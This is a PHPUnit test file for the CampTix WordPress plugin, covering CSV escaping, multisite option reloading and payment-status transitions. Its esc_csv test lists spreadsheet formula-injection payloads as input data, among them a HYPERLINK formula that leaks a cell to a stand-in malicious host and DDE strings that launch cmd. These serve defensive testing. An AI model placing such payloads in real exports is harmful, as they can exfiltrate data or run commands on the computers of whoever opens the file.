<?php

defined( 'WPINC' ) or die();

require_once __DIR__ . '/trait-wordcamp-root-blog.php';

/**
 * @covers CampTix_Plugin
 */
class Test_CampTix_Plugin extends \WP_UnitTestCase {
	use CampTix_Root_Blog_Fixture;

	public static function wpSetUpBeforeClass( $factory ) {
		self::create_wordcamp_root_blog( $factory );
	}

	public static function wpTearDownAfterClass() {
		self::delete_wordcamp_root_blog();
	}

	/**
	 * @covers CampTix_Plugin::esc_csv
	 */
	public function test_esc_csv() {
		$test_input = array(
			// Safe
			'CampTix',

			// Cells starting with trigger characters
			'=HYPERLINK("http://malicious.example.org/?leak="&A1,"Error: Click here to fix.")',
			'@HYPERLINK("http://malicious.example.org/wp-login.php","Please log back in to your account for more.")',
			"-2+3+cmd|' /C mstsc'!A0",
			"+2+3+cmd|' /C mspaint'!A0",
			";2+3+cmd|' /C calc'!A0",

			// Cells split by delimiters
			"foo ;=cmd|' /C SoundRecorder'!A0",
			"foo\n-2+3+cmd|' /C explorer'!A0",
			"   -2+3+cmd|' /C notepad'!A0",
			" -2+3+cmd|' /C calc'!A0",

			//mb tests
			"漢字はユニコ",
			"-漢字はユニコ ;=æ",
		);

		$expected_output = array(
			// Safe
			'CampTix',

			// Cells starting with trigger character
			'\'=HYPERLINK("http://malicious.example.org/?leak="&A1,"Error: Click here to fix.")',
			'\'@HYPERLINK("http://malicious.example.org/wp-login.php","Please log back in to your account for more.")',
			"'-2+3+cmd|' /C mstsc'!A0",
			"'+2+3+cmd|' /C mspaint'!A0",
			"';2+3+cmd|' /C calc'!A0",

			// Cells split by delimiters
			"foo ;'=cmd|' /C SoundRecorder'!A0",
			"foo\n'-2+3+cmd|' /C explorer'!A0",
			"'   '-2+3+cmd|' /C notepad'!A0",
			"' '-2+3+cmd|' /C calc'!A0",

			//mb_tests
			"漢字はユニコ",
			"'-漢字はユニコ ;'=æ",
		);

		$this->assertSame( $expected_output, CampTix_Plugin::esc_csv( $test_input ) );
	}

	/**
	 * `load_options()` should refresh `$camptix->options` for the current
	 * site, so multisite callers (like the centralized Stripe webhook) can
	 * pull in the switched-to site's settings before code that reads
	 * `$camptix->options` directly runs.
	 *
	 * @covers CampTix_Plugin::load_options
	 * @group  ms-required
	 */
	public function test_load_options_refreshes_cache_for_current_site() {
		if ( ! is_multisite() ) {
			$this->markTestSkipped( 'Multisite is required for this test.' );
		}

		/** @var CampTix_Plugin $camptix */
		global $camptix;

		$other_blog_id = self::factory()->blog->create();

		// Seed a distinct option directly on the secondary site.
		$secondary_seed = array(
			'event_name' => 'Secondary Event',
			'version'    => $camptix->version,
		);
		switch_to_blog( $other_blog_id );
		update_option( 'camptix_options', $secondary_seed );
		restore_current_blog();

		// Capture the primary site's event name before switching.
		$primary_event_name = $camptix->get_options()['event_name'];

		switch_to_blog( $other_blog_id );
		$camptix->load_options();
		$this->assertSame( 'Secondary Event', $camptix->get_options()['event_name'] );
		restore_current_blog();

		// Reload back into the primary site's options.
		$camptix->load_options();
		$this->assertSame( $primary_event_name, $camptix->get_options()['event_name'] );
	}

	/**
	 * Attendee IDs created during a test, cleaned up in tear_down.
	 *
	 * @var int[]
	 */
	protected $attendee_ids = array();

	/**
	 * Delete any attendees created during the test so they don't leak into siblings.
	 */
	public function tear_down() {
		foreach ( $this->attendee_ids as $id ) {
			wp_delete_post( $id, true );
		}
		$this->attendee_ids = array();

		parent::tear_down();
	}

	/**
	 * Create a tix_attendee post in the given status with the metadata
	 * payment_result() and email_tickets() expect to read.
	 *
	 * @param string $payment_token Payment token shared by the order.
	 * @param string $status        Initial post_status (draft, pending, publish, cancel, refund, failed).
	 *
	 * @return int Attendee ID.
	 */
	protected function create_attendee( $payment_token, $status ) {
		$attendee_id = wp_insert_post( array(
			'post_type'   => 'tix_attendee',
			'post_status' => $status,
			'post_title'  => 'Test Attendee',
		) );

		update_post_meta( $attendee_id, 'tix_payment_token', $payment_token );
		// email_tickets() is invoked on every successful status transition and
		// iterates $order['items'], so seed a minimal but valid order shape.
		update_post_meta(
			$attendee_id,
			'tix_order',
			array(
				'items' => array(),
				'total' => 0,
			)
		);
		update_post_meta( $attendee_id, 'tix_access_token', 'access_' . $attendee_id );
		update_post_meta( $attendee_id, 'tix_receipt_email', 'receipt@example.test' );

		$this->attendee_ids[] = $attendee_id;

		return $attendee_id;
	}

	/**
	 * A user-initiated cancel that arrives after the gateway's webhook published the
	 * order must not roll the attendee back to 'cancel' — the charge has been taken
	 * and the attendee is entitled to their ticket.
	 *
	 * @covers CampTix_Plugin::payment_result
	 */
	public function test_payment_result_does_not_cancel_published_attendee() {
		/** @var CampTix_Plugin $camptix */
		global $camptix;

		$payment_token = 'tok_already_published';
		$attendee_id   = $this->create_attendee( $payment_token, 'publish' );

		$camptix->payment_result( $payment_token, CampTix_Plugin::PAYMENT_STATUS_CANCELLED, array(), false );

		$this->assertSame( 'publish', get_post_status( $attendee_id ) );
	}

	/**
	 * Same protection applies when the gateway has reported the payment as pending
	 * (async confirmation in progress) or refunded — both are post-payment states
	 * that a user-initiated cancel must not downgrade.
	 *
	 * @covers CampTix_Plugin::payment_result
	 * @testWith ["pending"]
	 *           ["refund"]
	 */
	public function test_payment_result_does_not_cancel_post_payment_attendee( $status ) {
		/** @var CampTix_Plugin $camptix */
		global $camptix;

		$payment_token = 'tok_' . $status;
		$attendee_id   = $this->create_attendee( $payment_token, $status );

		$camptix->payment_result( $payment_token, CampTix_Plugin::PAYMENT_STATUS_CANCELLED, array(), false );

		$this->assertSame( $status, get_post_status( $attendee_id ) );
	}

	/**
	 * The normal pre-payment cancel — user hits "Cancel" before the gateway captures
	 * payment — must still flip the draft attendee to 'cancel'.
	 *
	 * @covers CampTix_Plugin::payment_result
	 */
	public function test_payment_result_cancels_draft_attendee() {
		/** @var CampTix_Plugin $camptix */
		global $camptix;

		$payment_token = 'tok_draft';
		$attendee_id   = $this->create_attendee( $payment_token, 'draft' );

		$camptix->payment_result( $payment_token, CampTix_Plugin::PAYMENT_STATUS_CANCELLED, array(), false );

		$this->assertSame( 'cancel', get_post_status( $attendee_id ) );
	}

	/**
	 * A late-arriving webhook reporting payment completion must be able to recover an
	 * attendee that was previously cancelled (e.g. by a stale redirect-cancel that
	 * landed before this fix, or a race we can't fully prevent).
	 *
	 * @covers CampTix_Plugin::payment_result
	 */
	public function test_payment_result_publishes_previously_cancelled_attendee() {
		/** @var CampTix_Plugin $camptix */
		global $camptix;

		$payment_token = 'tok_recover';
		$attendee_id   = $this->create_attendee( $payment_token, 'cancel' );

		$camptix->payment_result( $payment_token, CampTix_Plugin::PAYMENT_STATUS_COMPLETED, array(), false );

		$this->assertSame( 'publish', get_post_status( $attendee_id ) );
	}
}
